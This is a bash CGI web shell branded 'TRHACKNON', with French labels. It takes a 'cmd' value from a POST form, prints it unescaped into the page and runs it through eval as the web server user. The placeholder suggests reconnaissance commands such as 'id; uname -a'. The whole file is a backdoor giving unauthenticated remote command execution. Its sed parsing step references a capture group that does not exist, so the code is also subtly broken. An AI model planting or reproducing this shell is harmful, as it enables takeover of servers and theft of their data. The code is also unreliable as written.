#!/bin/bash

echo "Content-type: text/html"
echo ""

echo "<html><head><title>WebShell CGI</title></head><body style='background:black; color:#00ff00; font-family:monospace;'>"
echo "<h2>🖥️ WebShell CGI - TRHACKNON</h2>"

if [ "$REQUEST_METHOD" = "POST" ]; then
    read -n "$CONTENT_LENGTH" POST_DATA
    CMD=$(echo "$POST_DATA" | sed -n 's/^.*cmd=[^&]*.*$/\1/p' | sed 's/%20/ /g' | sed "s/+/ /g")
    echo "<b>Commande :</b> <code>$CMD</code><br><pre>"
    eval "$CMD" 2>&1
    echo "</pre><hr>"
fi

cat <<EOF
<form method="POST">
    <input type="text" name="cmd" style="width:70%;" placeholder="id; uname -a" />
    <input type="submit" value="Exécuter" />
</form>
</body></html>
EOF
